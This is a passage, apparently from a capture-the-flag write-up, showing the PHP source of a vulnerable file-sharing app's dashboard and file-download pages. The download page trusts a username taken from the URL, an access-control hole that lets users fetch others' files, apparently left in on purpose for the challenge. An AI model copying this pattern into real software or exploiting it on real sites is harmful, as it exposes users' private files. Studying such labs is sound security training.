</span><span id="__span-15-4"><a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a><span class="w">    </span>header<span class="o">(</span><span class="s1">&#39;Location: login.php&#39;</span><span class="o">)</span><span class="p">;</span>
</span><span id="__span-15-5"><a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a><span class="w">    </span>exit<span class="o">()</span><span class="p">;</span>
</span><span id="__span-15-6"><a id="__codelineno-15-6" name="__codelineno-15-6" href="#__codelineno-15-6"></a><span class="o">}</span>
</span><span id="__span-15-7"><a id="__codelineno-15-7" name="__codelineno-15-7" href="#__codelineno-15-7"></a>
</span><span id="__span-15-8"><a id="__codelineno-15-8" name="__codelineno-15-8" href="#__codelineno-15-8"></a><span class="nv">$db</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>new<span class="w"> </span>SQLite3<span class="o">(</span><span class="s1">&#39;../nocturnal_database/nocturnal_database.db&#39;</span><span class="o">)</span><span class="p">;</span>
</span><span id="__span-15-9"><a id="__codelineno-15-9" name="__codelineno-15-9" href="#__codelineno-15-9"></a><span class="nv">$user_id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$_SESSION</span><span class="o">[</span><span class="s1">&#39;user_id&#39;</span><span class="o">]</span><span class="p">;</span>
</span><span id="__span-15-10"><a id="__codelineno-15-10" name="__codelineno-15-10" href="#__codelineno-15-10"></a><span class="nv">$username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$_SESSION</span><span class="o">[</span><span class="s1">&#39;username&#39;</span><span class="o">]</span><span class="p">;</span>
</span><span id="__span-15-11"><a id="__codelineno-15-11" name="__codelineno-15-11" href="#__codelineno-15-11"></a>
</span><span id="__span-15-12"><a id="__codelineno-15-12" name="__codelineno-15-12" href="#__codelineno-15-12"></a>//<span class="w"> </span>Handle<span class="w"> </span>file<span class="w"> </span>upload
</span><span id="__span-15-13"><a id="__codelineno-15-13" name="__codelineno-15-13" href="#__codelineno-15-13"></a><span class="k">if</span><span class="w"> </span><span class="o">(</span><span class="nv">$_SERVER</span><span class="o">[</span><span class="s1">&#39;REQUEST_METHOD&#39;</span><span class="o">]</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="s1">&#39;POST&#39;</span><span class="o">)</span><span class="w"> </span><span class="o">{</span>
</span><span id="__span-15-14"><a id="__codelineno-15-14" name="__codelineno-15-14" href="#__codelineno-15-14"></a><span class="w">    </span><span class="nv">$target_dir</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;uploads/&quot;</span><span class="p">;</span>
</span><span id="__span-15-15"><a id="__codelineno-15-15" name="__codelineno-15-15" href="#__codelineno-15-15"></a><span class="w">    </span><span class="nv">$file_name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>basename<span class="o">(</span><span class="nv">$_FILES</span><span class="o">[</span><span class="s2">&quot;fileToUpload&quot;</span><span class="o">][</span><span class="s2">&quot;name&quot;</span><span class="o">])</span><span class="p">;</span>
</span><span id="__span-15-16"><a id="__codelineno-15-16" name="__codelineno-15-16" href="#__codelineno-15-16"></a><span class="w">    </span><span class="nv">$target_file</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$target_dir</span><span class="w"> </span>.<span class="w"> </span><span class="nv">$file_name</span><span class="p">;</span>
</span><span id="__span-15-17"><a id="__codelineno-15-17" name="__codelineno-15-17" href="#__codelineno-15-17"></a><span class="w">    </span><span class="nv">$file_type</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>strtolower<span class="o">(</span>pathinfo<span class="o">(</span><span class="nv">$target_file</span>,<span class="w"> </span>PATHINFO_EXTENSION<span class="o">))</span><span class="p">;</span>
</span><span id="__span-15-18"><a id="__codelineno-15-18" name="__codelineno-15-18" href="#__codelineno-15-18"></a>
</span><span id="__span-15-19"><a id="__codelineno-15-19" name="__codelineno-15-19" href="#__codelineno-15-19"></a><span class="w">    </span><span class="nv">$allowed_types</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>array<span class="o">(</span><span class="s2">&quot;pdf&quot;</span>,<span class="w"> </span><span class="s2">&quot;doc&quot;</span>,<span class="w"> </span><span class="s2">&quot;docx&quot;</span>,<span class="w"> </span><span class="s2">&quot;xls&quot;</span>,<span class="w"> </span><span class="s2">&quot;xlsx&quot;</span>,<span class="w"> </span><span class="s2">&quot;odt&quot;</span><span class="o">)</span><span class="p">;</span>
</span><span id="__span-15-20"><a id="__codelineno-15-20" name="__codelineno-15-20" href="#__codelineno-15-20"></a>
</span><span id="__span-15-21"><a id="__codelineno-15-21" name="__codelineno-15-21" href="#__codelineno-15-21"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="o">(</span>in_array<span class="o">(</span><span class="nv">$file_type</span>,<span class="w"> </span><span class="nv">$allowed_types</span><span class="o">))</span><span class="w"> </span><span class="o">{</span>
</span><span id="__span-15-22"><a id="__codelineno-15-22" name="__codelineno-15-22" href="#__codelineno-15-22"></a><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="o">(</span>move_uploaded_file<span class="o">(</span><span class="nv">$_FILES</span><span class="o">[</span><span class="s2">&quot;fileToUpload&quot;</span><span class="o">][</span><span class="s2">&quot;tmp_name&quot;</span><span class="o">]</span>,<span class="w"> </span><span class="nv">$target_file</span><span class="o">))</span><span class="w"> </span><span class="o">{</span>
</span><span id="__span-15-23"><a id="__codelineno-15-23" name="__codelineno-15-23" href="#__codelineno-15-23"></a><span class="w">            </span><span class="nv">$stmt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$db</span>-&gt;prepare<span class="o">(</span><span class="s2">&quot;INSERT INTO uploads (user_id, file_name) VALUES (:user_id, :file_name)&quot;</span><span class="o">)</span><span class="p">;</span>
</span><span id="__span-15-24"><a id="__codelineno-15-24" name="__codelineno-15-24" href="#__codelineno-15-24"></a><span class="w">            </span><span class="nv">$stmt</span>-&gt;bindValue<span class="o">(</span><span class="s1">&#39;:user_id&#39;</span>,<span class="w"> </span><span class="nv">$user_id</span>,<span class="w"> </span>SQLITE3_INTEGER<span class="o">)</span><span class="p">;</span>
</span><span id="__span-15-25"><a id="__codelineno-15-25" name="__codelineno-15-25" href="#__codelineno-15-25"></a><span class="w">            </span><span class="nv">$stmt</span>-&gt;bindValue<span class="o">(</span><span class="s1">&#39;:file_name&#39;</span>,<span class="w"> </span><span class="nv">$file_name</span>,<span class="w"> </span>SQLITE3_TEXT<span class="o">)</span><span class="p">;</span>
</span><span id="__span-15-26"><a id="__codelineno-15-26" name="__codelineno-15-26" href="#__codelineno-15-26"></a><span class="w">            </span><span class="nv">$stmt</span>-&gt;execute<span class="o">()</span><span class="p">;</span>
</span><span id="__span-15-27"><a id="__codelineno-15-27" name="__codelineno-15-27" href="#__codelineno-15-27"></a><span class="w">        </span><span class="o">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="o">{</span>
</span><span id="__span-15-28"><a id="__codelineno-15-28" name="__codelineno-15-28" href="#__codelineno-15-28"></a><span class="w">            </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;Error uploading file.&quot;</span><span class="p">;</span>
</span><span id="__span-15-29"><a id="__codelineno-15-29" name="__codelineno-15-29" href="#__codelineno-15-29"></a><span class="w">        </span><span class="o">}</span>
</span><span id="__span-15-30"><a id="__codelineno-15-30" name="__codelineno-15-30" href="#__codelineno-15-30"></a><span class="w">    </span><span class="o">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="o">{</span>
</span><span id="__span-15-31"><a id="__codelineno-15-31" name="__codelineno-15-31" href="#__codelineno-15-31"></a><span class="w">        </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;Invalid file type. pdf, doc, docx, xls, xlsx, odt are allowed.&quot;</span><span class="p">;</span>
</span><span id="__span-15-32"><a id="__codelineno-15-32" name="__codelineno-15-32" href="#__codelineno-15-32"></a><span class="w">    </span><span class="o">}</span>
</span><span id="__span-15-33"><a id="__codelineno-15-33" name="__codelineno-15-33" href="#__codelineno-15-33"></a><span class="o">}</span>
</span><span id="__span-15-34"><a id="__codelineno-15-34" name="__codelineno-15-34" href="#__codelineno-15-34"></a>
</span><span id="__span-15-35"><a id="__codelineno-15-35" name="__codelineno-15-35" href="#__codelineno-15-35"></a>//<span class="w"> </span>Get<span class="w"> </span>user<span class="s1">&#39;s uploaded files</span>
</span><span id="__span-15-36"><a id="__codelineno-15-36" name="__codelineno-15-36" href="#__codelineno-15-36"></a><span class="s1">$stmt = $db-&gt;prepare(&quot;SELECT * FROM uploads WHERE user_id = :user_id&quot;);</span>
</span><span id="__span-15-37"><a id="__codelineno-15-37" name="__codelineno-15-37" href="#__codelineno-15-37"></a><span class="s1">$stmt-&gt;bindValue(&#39;</span>:user_id<span class="s1">&#39;, $user_id, SQLITE3_INTEGER);</span>
</span><span id="__span-15-38"><a id="__codelineno-15-38" name="__codelineno-15-38" href="#__codelineno-15-38"></a><span class="s1">$files = $stmt-&gt;execute();</span>
</span><span id="__span-15-39"><a id="__codelineno-15-39" name="__codelineno-15-39" href="#__codelineno-15-39"></a><span class="s1">?&gt;</span>
</span><span id="__span-15-40"><a id="__codelineno-15-40" name="__codelineno-15-40" href="#__codelineno-15-40"></a>
</span><span id="__span-15-41"><a id="__codelineno-15-41" name="__codelineno-15-41" href="#__codelineno-15-41"></a><span class="s1">&lt;!DOCTYPE html&gt;</span>
</span><span id="__span-15-42"><a id="__codelineno-15-42" name="__codelineno-15-42" href="#__codelineno-15-42"></a><span class="s1">&lt;html lang=&quot;en&quot;&gt;</span>
</span><span id="__span-15-43"><a id="__codelineno-15-43" name="__codelineno-15-43" href="#__codelineno-15-43"></a><span class="s1">&lt;head&gt;</span>
</span><span id="__span-15-44"><a id="__codelineno-15-44" name="__codelineno-15-44" href="#__codelineno-15-44"></a><span class="s1">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span>
</span><span id="__span-15-45"><a id="__codelineno-15-45" name="__codelineno-15-45" href="#__codelineno-15-45"></a><span class="s1">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span>
</span><span id="__span-15-46"><a id="__codelineno-15-46" name="__codelineno-15-46" href="#__codelineno-15-46"></a><span class="s1">    &lt;title&gt;Dashboard&lt;/title&gt;</span>
</span><span id="__span-15-47"><a id="__codelineno-15-47" name="__codelineno-15-47" href="#__codelineno-15-47"></a><span class="s1">    &lt;link rel=&quot;stylesheet&quot; href=&quot;style.css&quot;&gt;</span>
</span><span id="__span-15-48"><a id="__codelineno-15-48" name="__codelineno-15-48" href="#__codelineno-15-48"></a><span class="s1">&lt;/head&gt;</span>
</span><span id="__span-15-49"><a id="__codelineno-15-49" name="__codelineno-15-49" href="#__codelineno-15-49"></a><span class="s1">&lt;body&gt;</span>
</span><span id="__span-15-50"><a id="__codelineno-15-50" name="__codelineno-15-50" href="#__codelineno-15-50"></a><span class="s1">    &lt;div class=&quot;container&quot;&gt;</span>
</span><span id="__span-15-51"><a id="__codelineno-15-51" name="__codelineno-15-51" href="#__codelineno-15-51"></a><span class="s1">        &lt;?php if ($username === &#39;</span>admin<span class="s1">&#39; || $username === &#39;</span>amanda<span class="s1">&#39;): ?&gt;</span>
</span><span id="__span-15-52"><a id="__codelineno-15-52" name="__codelineno-15-52" href="#__codelineno-15-52"></a><span class="s1">            &lt;p&gt;&lt;a href=&quot;/admin.php&quot;&gt;Go to Admin Panel&lt;/a&gt;&lt;/p&gt;</span>
</span><span id="__span-15-53"><a id="__codelineno-15-53" name="__codelineno-15-53" href="#__codelineno-15-53"></a><span class="s1">        &lt;?php endif; ?&gt;</span>
</span><span id="__span-15-54"><a id="__codelineno-15-54" name="__codelineno-15-54" href="#__codelineno-15-54"></a><span class="s1">         &lt;h1&gt;Welcome, &lt;?php echo htmlspecialchars($username); ?&gt;&lt;/h1&gt;</span>
</span><span id="__span-15-55"><a id="__codelineno-15-55" name="__codelineno-15-55" href="#__codelineno-15-55"></a>
</span><span id="__span-15-56"><a id="__codelineno-15-56" name="__codelineno-15-56" href="#__codelineno-15-56"></a><span class="s1">        &lt;h2&gt;Upload File&lt;/h2&gt;</span>
</span><span id="__span-15-57"><a id="__codelineno-15-57" name="__codelineno-15-57" href="#__codelineno-15-57"></a><span class="s1">        &lt;form action=&quot;&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span>
</span><span id="__span-15-58"><a id="__codelineno-15-58" name="__codelineno-15-58" href="#__codelineno-15-58"></a><span class="s1">            &lt;input type=&quot;file&quot; name=&quot;fileToUpload&quot; required&gt;</span>
</span><span id="__span-15-59"><a id="__codelineno-15-59" name="__codelineno-15-59" href="#__codelineno-15-59"></a><span class="s1">            &lt;button type=&quot;submit&quot;&gt;Upload File&lt;/button&gt;</span>
</span><span id="__span-15-60"><a id="__codelineno-15-60" name="__codelineno-15-60" href="#__codelineno-15-60"></a><span class="s1">        &lt;/form&gt;</span>
</span><span id="__span-15-61"><a id="__codelineno-15-61" name="__codelineno-15-61" href="#__codelineno-15-61"></a>
</span><span id="__span-15-62"><a id="__codelineno-15-62" name="__codelineno-15-62" href="#__codelineno-15-62"></a><span class="s1">        &lt;h2&gt;Your Files&lt;/h2&gt;</span>
</span><span id="__span-15-63"><a id="__codelineno-15-63" name="__codelineno-15-63" href="#__codelineno-15-63"></a><span class="s1">        &lt;ul&gt;</span>
</span><span id="__span-15-64"><a id="__codelineno-15-64" name="__codelineno-15-64" href="#__codelineno-15-64"></a><span class="s1">            &lt;?php while ($row = $files-&gt;fetchArray()): ?&gt;</span>
</span><span id="__span-15-65"><a id="__codelineno-15-65" name="__codelineno-15-65" href="#__codelineno-15-65"></a><span class="s1">                &lt;li&gt;</span>
</span><span id="__span-15-66"><a id="__codelineno-15-66" name="__codelineno-15-66" href="#__codelineno-15-66"></a><span class="s1">                    &lt;a href=&quot;view.php?username=&lt;?php echo urlencode($username); ?&gt;&amp;file=&lt;?php echo urlencode($row[&#39;</span>file_name<span class="s1">&#39;]); ?&gt;&quot;&gt;</span>
</span><span id="__span-15-67"><a id="__codelineno-15-67" name="__codelineno-15-67" href="#__codelineno-15-67"></a><span class="s1">                        &lt;?php echo htmlspecialchars($row[&#39;</span>file_name<span class="s1">&#39;]); ?&gt;</span>
</span><span id="__span-15-68"><a id="__codelineno-15-68" name="__codelineno-15-68" href="#__codelineno-15-68"></a><span class="s1">                    &lt;/a&gt;</span>
</span><span id="__span-15-69"><a id="__codelineno-15-69" name="__codelineno-15-69" href="#__codelineno-15-69"></a><span class="s1">                    &lt;span&gt;(Uploaded on &lt;?php echo $row[&#39;</span>upload_time<span class="err">&#39;</span><span class="o">]</span><span class="p">;</span><span class="w"> </span>?&gt;<span class="o">)</span>&lt;/span&gt;
</span><span id="__span-15-70"><a id="__codelineno-15-70" name="__codelineno-15-70" href="#__codelineno-15-70"></a><span class="w">                </span>&lt;/li&gt;
</span><span id="__span-15-71"><a id="__codelineno-15-71" name="__codelineno-15-71" href="#__codelineno-15-71"></a><span class="w">            </span>&lt;?php<span class="w"> </span>endwhile<span class="p">;</span><span class="w"> </span>?&gt;
</span><span id="__span-15-72"><a id="__codelineno-15-72" name="__codelineno-15-72" href="#__codelineno-15-72"></a><span class="w">        </span>&lt;/ul&gt;
</span><span id="__span-15-73"><a id="__codelineno-15-73" name="__codelineno-15-73" href="#__codelineno-15-73"></a>
</span><span id="__span-15-74"><a id="__codelineno-15-74" name="__codelineno-15-74" href="#__codelineno-15-74"></a><span class="w">        </span>&lt;a<span class="w"> </span><span class="nv">href</span><span class="o">=</span><span class="s2">&quot;logout.php&quot;</span><span class="w"> </span><span class="nv">class</span><span class="o">=</span><span class="s2">&quot;logout&quot;</span>&gt;Logout&lt;/a&gt;
</span><span id="__span-15-75"><a id="__codelineno-15-75" name="__codelineno-15-75" href="#__codelineno-15-75"></a><span class="w">    </span>&lt;/div&gt;
</span><span id="__span-15-76"><a id="__codelineno-15-76" name="__codelineno-15-76" href="#__codelineno-15-76"></a>&lt;/body&gt;
</span><span id="__span-15-77"><a id="__codelineno-15-77" name="__codelineno-15-77" href="#__codelineno-15-77"></a>&lt;/html&gt;
</span></code></pre></div>
<ul>
<li>view.php -&gt; when you download the file</li>
</ul>
<div class="language-shell highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>&lt;?php<span class="w"> </span>ob_start<span class="o">()</span><span class="p">;</span><span class="w"> </span>?&gt;
</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>&lt;!DOCTYPE<span class="w"> </span>html&gt;
</span><span id="__span-16-3"><a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a>&lt;html<span class="w"> </span><span class="nv">lang</span><span class="o">=</span><span class="s2">&quot;en&quot;</span>&gt;
</span><span id="__span-16-4"><a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a>&lt;head&gt;
</span><span id="__span-16-5"><a id="__codelineno-16-5" name="__codelineno-16-5" href="#__codelineno-16-5"></a><span class="w">    </span>&lt;meta<span class="w"> </span><span class="nv">charset</span><span class="o">=</span><span class="s2">&quot;UTF-8&quot;</span>&gt;
</span><span id="__span-16-6"><a id="__codelineno-16-6" name="__codelineno-16-6" href="#__codelineno-16-6"></a><span class="w">    </span>&lt;meta<span class="w"> </span><span class="nv">name</span><span class="o">=</span><span class="s2">&quot;viewport&quot;</span><span class="w"> </span><span class="nv">content</span><span class="o">=</span><span class="s2">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;
</span><span id="__span-16-7"><a id="__codelineno-16-7" name="__codelineno-16-7" href="#__codelineno-16-7"></a><span class="w">    </span>&lt;title&gt;View<span class="w"> </span>File&lt;/title&gt;
</span><span id="__span-16-8"><a id="__codelineno-16-8" name="__codelineno-16-8" href="#__codelineno-16-8"></a>&lt;/head&gt;
</span><span id="__span-16-9"><a id="__codelineno-16-9" name="__codelineno-16-9" href="#__codelineno-16-9"></a>&lt;body&gt;
</span><span id="__span-16-10"><a id="__codelineno-16-10" name="__codelineno-16-10" href="#__codelineno-16-10"></a>
</span><span id="__span-16-11"><a id="__codelineno-16-11" name="__codelineno-16-11" href="#__codelineno-16-11"></a>&lt;div<span class="w"> </span><span class="nv">class</span><span class="o">=</span><span class="s2">&quot;container&quot;</span>&gt;
</span><span id="__span-16-12"><a id="__codelineno-16-12" name="__codelineno-16-12" href="#__codelineno-16-12"></a><span class="w">    </span>&lt;h1&gt;File<span class="w"> </span>Viewer&lt;/h1&gt;
</span><span id="__span-16-13"><a id="__codelineno-16-13" name="__codelineno-16-13" href="#__codelineno-16-13"></a>
</span><span id="__span-16-14"><a id="__codelineno-16-14" name="__codelineno-16-14" href="#__codelineno-16-14"></a><span class="w">    </span>&lt;?php
</span><span id="__span-16-15"><a id="__codelineno-16-15" name="__codelineno-16-15" href="#__codelineno-16-15"></a><span class="w">    </span>session_start<span class="o">()</span><span class="p">;</span>
</span><span id="__span-16-16"><a id="__codelineno-16-16" name="__codelineno-16-16" href="#__codelineno-16-16"></a>
</span><span id="__span-16-17"><a id="__codelineno-16-17" name="__codelineno-16-17" href="#__codelineno-16-17"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="o">(</span>!isset<span class="o">(</span><span class="nv">$_SESSION</span><span class="o">[</span><span class="s1">&#39;user_id&#39;</span><span class="o">]))</span><span class="w"> </span><span class="o">{</span>
</span><span id="__span-16-18"><a id="__codelineno-16-18" name="__codelineno-16-18" href="#__codelineno-16-18"></a><span class="w">        </span>header<span class="o">(</span><span class="s1">&#39;Location: login.php&#39;</span><span class="o">)</span><span class="p">;</span>
</span><span id="__span-16-19"><a id="__codelineno-16-19" name="__codelineno-16-19" href="#__codelineno-16-19"></a><span class="w">        </span>exit<span class="o">()</span><span class="p">;</span>
</span><span id="__span-16-20"><a id="__codelineno-16-20" name="__codelineno-16-20" href="#__codelineno-16-20"></a><span class="w">    </span><span class="o">}</span>
</span><span id="__span-16-21"><a id="__codelineno-16-21" name="__codelineno-16-21" href="#__codelineno-16-21"></a>
</span><span id="__span-16-22"><a id="__codelineno-16-22" name="__codelineno-16-22" href="#__codelineno-16-22"></a><span class="w">    </span><span class="nv">$db</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>new<span class="w"> </span>SQLite3<span class="o">(</span><span class="s1">&#39;../nocturnal_database/nocturnal_database.db&#39;</span><span class="o">)</span><span class="p">;</span>
</span><span id="__span-16-23"><a id="__codelineno-16-23" name="__codelineno-16-23" href="#__codelineno-16-23"></a>
</span><span id="__span-16-24"><a id="__codelineno-16-24" name="__codelineno-16-24" href="#__codelineno-16-24"></a><span class="w">    </span><span class="nv">$username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$_GET</span><span class="o">[</span><span class="s1">&#39;username&#39;</span><span class="o">]</span><span class="p">;</span>
</span><span id="__span-16-25"><a id="__codelineno-16-25" name="__codelineno-16-25" href="#__codelineno-16-25"></a><span class="w">    </span><span class="nv">$file</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>basename<span class="o">(</span><span class="nv">$_GET</span><span class="o">[</span><span class="s1">&#39;file&#39;</span><span class="o">])</span><span class="p">;</span>
</span><span id="__span-16-26"><a id="__codelineno-16-26" name="__codelineno-16-26" href="#__codelineno-16-26"></a>
</span><span id="__span-16-27"><a id="__codelineno-16-27" name="__codelineno-16-27" href="#__codelineno-16-27"></a><span class="w">    </span><span class="nv">$allowed_extensions</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">[</span><span class="s2">&quot;pdf&quot;</span>,<span class="w"> </span><span class="s2">&quot;doc&quot;</span>,<span class="w"> </span><span class="s2">&quot;docx&quot;</span>,<span class="w"> </span><span class="s2">&quot;xls&quot;</span>,<span class="w"> </span><span class="s2">&quot;xlsx&quot;</span>,<span class="w"> </span><span class="s2">&quot;odt&quot;</span><span class="o">]</span><span class="p">;</span>
</span><span id="__span-16-28"><a id="__codelineno-16-28" name="__codelineno-16-28" href="#__codelineno-16-28"></a><span class="w">    </span><span class="nv">$file_extension</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>pathinfo<span class="o">(</span><span class="nv">$file</span>,<span class="w"> </span>PATHINFO_EXTENSION<span class="o">)</span><span class="p">;</span>
</span><span id="__span-16-29"><a id="__codelineno-16-29" name="__codelineno-16-29" href="#__codelineno-16-29"></a>
</span><span id="__span-16-30"><a id="__codelineno-16-30" name="__codelineno-16-30" href="#__codelineno-16-30"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="o">(</span>!in_array<span class="o">(</span><span class="nv">$file_extension</span>,<span class="w"> </span><span class="nv">$allowed_extensions</span><span class="o">))</span><span class="w"> </span><span class="o">{</span>
</span><span id="__span-16-31"><a id="__codelineno-16-31" name="__codelineno-16-31" href="#__codelineno-16-31"></a><span class="w">        </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;&lt;div class=&#39;error&#39;&gt;Invalid file extension.&lt;/div&gt;&quot;</span><span class="p">;</span>
</span><span id="__span-16-32"><a id="__codelineno-16-32" name="__codelineno-16-32" href="#__codelineno-16-32"></a><span class="w">        </span>exit<span class="o">()</span><span class="p">;</span>
</span><span id="__span-16-33"><a id="__codelineno-16-33" name="__codelineno-16-33" href="#__codelineno-16-33"></a><span class="w">    </span><span class="o">}</span>
</span><span id="__span-16-34"><a id="__codelineno-16-34" name="__codelineno-16-34" href="#__codelineno-16-34"></a>
</span><span id="__span-16-35"><a id="__codelineno-16-35" name="__codelineno-16-35" href="#__codelineno-16-35"></a><span class="w">    </span><span class="nv">$stmt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$db</span>-&gt;prepare<span class="o">(</span><span class="s1">&#39;SELECT id FROM users WHERE username = :username&#39;</span><span class="o">)</span><span class="p">;</span>
</span><span id="__span-16-36"><a id="__codelineno-16-36" name="__codelineno-16-36" href="#__codelineno-16-36"></a><span class="w">    </span><span class="nv">$stmt</span>-&gt;bindValue<span class="o">(</span><span class="s1">&#39;:username&#39;</span>,<span class="w"> </span><span class="nv">$username</span>,<span class="w"> </span>SQLITE3_TEXT<span class="o">)</span><span class="p">;</span>
</span><span id="__span-16-37"><a id="__codelineno-16-37" name="__codelineno-16-37" href="#__codelineno-16-37"></a><span class="w">    </span><span class="nv">$result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$stmt</span>-&gt;execute<span class="o">()</span><span class="p">;</span>
</span><span id="__span-16-38"><a id="__codelineno-16-38" name="__codelineno-16-38" href="#__codelineno-16-38"></a>
</span><span id="__span-16-39"><a id="__codelineno-16-39" name="__codelineno-16-39" href="#__codelineno-16-39"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="o">(</span><span class="nv">$row</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$result</span>-&gt;fetchArray<span class="o">())</span><span class="w"> </span><span class="o">{</span>
</span><span id="__span-16-40"><a id="__codelineno-16-40" name="__codelineno-16-40" href="#__codelineno-16-40"></a><span class="w">        </span><span class="nv">$user_id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$row</span><span class="o">[</span><span class="s1">&#39;id&#39;</span><span class="o">]</span><span class="p">;</span>
</span><span id="__span-16-41"><a id="__codelineno-16-41" name="__codelineno-16-41" href="#__codelineno-16-41"></a>
</span><span id="__span-16-42"><a id="__codelineno-16-42" name="__codelineno-16-42" href="#__codelineno-16-42"></a><span class="w">        </span><span class="nv">$stmt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$db</span>-&gt;prepare<span class="o">(</span><span class="s1">&#39;SELECT * FROM uploads WHERE user_id = :user_id AND file_name = :file&#39;</span><span class="o">)</span><span class="p">;</span>
</span><span id="__span-16-43"><a id="__codelineno-16-43" name="__codelineno-16-43" href="#__codelineno-16-43"></a><span class="w">        </span><span class="nv">$stmt</span>-&gt;bindValue<span class="o">(</span><span class="s1">&#39;:user_id&#39;</span>,<span class="w"> </span><span class="nv">$user_id</span>,<span class="w"> </span>SQLITE3_INTEGER<span class="o">)</span><span class="p">;</span>
</span><span id="__span-16-44"><a id="__codelineno-16-44" name="__codelineno-16-44" href="#__codelineno-16-44"></a><span class="w">        </span><span class="nv">$stmt</span>-&gt;bindValue<span class="o">(</span><span class="s1">&#39;:file&#39;</span>,<span class="w"> </span><span class="nv">$file</span>,<span class="w"> </span>SQLITE3_TEXT<span class="o">)</span><span class="p">;</span>
</span><span id="__span-16-45"><a id="__codelineno-16-45" name="__codelineno-16-45" href="#__codelineno-16-45"></a><span class="w">        </span><span class="nv">$result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$stmt</span>-&gt;execute<span class="o">()</span><span class="p">;</span>
</span><span id="__span-16-46"><a id="__codelineno-16-46" name="__codelineno-16-46" href="#__codelineno-16-46"></a>
</span><span id="__span-16-47"><a id="__codelineno-16-47" name="__codelineno-16-47" href="#__codelineno-16-47"></a><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="o">(</span><span class="nv">$row</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$result</span>-&gt;fetchArray<span class="o">())</span><span class="w"> </span><span class="o">{</span>
</span><span id="__span-16-48"><a id="__codelineno-16-48" name="__codelineno-16-48" href="#__codelineno-16-48"></a><span class="w">            </span><span class="nv">$file_path</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;uploads/&#39;</span><span class="w"> </span>.<span class="w"> </span><span class="nv">$file</span><span class="p">;</span>
</span><span id="__span-16-49"><a id="__codelineno-16-49" name="__codelineno-16-49" href="#__codelineno-16-49"></a>
</span><span id="__span-16-50"><a id="__codelineno-16-50" name="__codelineno-16-50" href="#__codelineno-16-50"></a><span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="o">(</span>file_exists<span class="o">(</span><span class="nv">$file_path</span><span class="o">))</span><span class="w"> </span><span class="o">{</span>
</span><span id="__span-16-51"><a id="__codelineno-16-51" name="__codelineno-16-51" href="#__codelineno-16-51"></a><span class="w">                </span>ob_clean<span class="o">()</span><span class="p">;</span>
</span><span id="__span-16-52"><a id="__codelineno-16-52" name="__codelineno-16-52" href="#__codelineno-16-52"></a><span class="w">                </span>header<span class="o">(</span><span class="s1">&#39;Content-Type: application/octet-stream&#39;</span><span class="o">)</span><span class="p">;</span>
</span><span id="__span-16-53"><a id="__codelineno-16-53" name="__codelineno-16-53" href="#__codelineno-16-53"></a><span class="w">                </span>header<span class="o">(</span><span class="s1">&#39;Content-Disposition: attachment; filename=&quot;&#39;</span><span class="w"> </span>.<span class="w"> </span>basename<span class="o">(</span><span class="nv">$file_path</span><span class="o">)</span><span class="w"> </span>.<span class="w"> </span><span class="s1">&#39;&quot;&#39;</span><span class="o">)</span><span class="p">;</span>
</span><span id="__span-16-54"><a id="__codelineno-16-54" name="__codelineno-16-54" href="#__codelineno-16-54"></a><span class="w">                </span>readfile<span class="o">(</span><span class="nv">$file_path</span><span class="o">)</span><span class="p">;</span>
</span><span id="__span-16-55"><a id="__codelineno-16-55" name="__codelineno-16-55" href="#__codelineno-16-55"></a><span class="w">                </span>exit<span class="o">()</span><span class="p">;</span>
</span><span id="__span-16-56"><a id="__codelineno-16-56" name="__codelineno-16-56" href="#__codelineno-16-56"></a><span class="w">            </span><span class="o">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="o">{</span>
